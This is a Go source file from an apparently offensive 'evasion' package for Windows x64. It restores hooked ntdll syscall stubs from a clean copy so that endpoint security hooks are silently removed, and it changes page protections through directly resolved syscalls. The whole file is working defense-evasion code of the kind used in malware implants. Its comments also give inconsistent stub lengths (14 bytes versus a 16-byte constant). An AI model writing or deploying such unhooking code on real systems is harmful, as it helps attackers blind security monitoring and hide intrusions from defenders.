//go:build windows && amd64

package evasion

import (
	"fmt"
	"unsafe"
)

// stubPatchLen is how many bytes of each syscall stub prologue are
// compared/patched against the clean image. All of the resolved Nt* stubs
// are `mov r10, rcx; mov eax, imm32; syscall; ret` (14 bytes).
const stubPatchLen = 16

// unhookStubs rewrites the live stub prologues of the hash-listed exports
// from the clean copy, neutralizing any in-memory detours. It returns the
// number of stubs that differed and were restored. The direct syscall table
// is unaffected by this either way (SSNs are already resolved); the point is
// to leave live ntdll's user-mode surface byte-identical to disk so later
// instrumented callers cannot trip on patched stubs.
func unhookStubs(live, clean unsafe.Pointer, hashes []uint32) int {
	var patched int
	for _, h := range hashes {
		liveFn, err := resolveExport(live, h)
		if err != nil {
			continue
		}
		cleanFn, err := resolveExport(clean, h)
		if err != nil {
			continue
		}
		if bytesEqual(liveFn, cleanFn, stubPatchLen) {
			continue
		}
		if err := patchStub(liveFn, cleanFn); err != nil {
			continue
		}
		patched++
	}
	return patched
}

// patchStub makes the target page writable, copies the clean prologue over
// the live stub, and restores the previous protection. It uses the already
// resolved syscall table directly: it runs inside resolve()'s once, so it
// must not route through the initSys()-guarded wrappers.
func patchStub(dst, src unsafe.Pointer) error {
	page := uintptr(dst) &^ 0xFFF
	var b = page
	var s uintptr = 0x1000
	var old uint32
	if st := call(sysTbl.protectVM, CurrentProcess, uintptr(unsafe.Pointer(&b)), uintptr(unsafe.Pointer(&s)), 0x04, uintptr(unsafe.Pointer(&old))); int32(uint32(st)) < 0 {
		return errStatus(st)
	}
	for i := 0; i < stubPatchLen; i++ {
		*(*uint8)(unsafe.Add(dst, i)) = *(*uint8)(unsafe.Add(src, i))
	}
	var b2 = page
	var s2 uintptr = 0x1000
	var old2 uint32
	if st := call(sysTbl.protectVM, CurrentProcess, uintptr(unsafe.Pointer(&b2)), uintptr(unsafe.Pointer(&s2)), uintptr(old), uintptr(unsafe.Pointer(&old2))); int32(uint32(st)) < 0 {
		return errStatus(st)
	}
	return nil
}

func errStatus(st uintptr) error {
	return fmt.Errorf("evasion: NtProtectVirtualMemory: 0x%08X", uint32(st))
}

func bytesEqual(a, b unsafe.Pointer, n int) bool {
	for i := 0; i < n; i++ {
		if rd8(unsafe.Add(a, i)) != rd8(unsafe.Add(b, i)) {
			return false
		}
	}
	return true
}
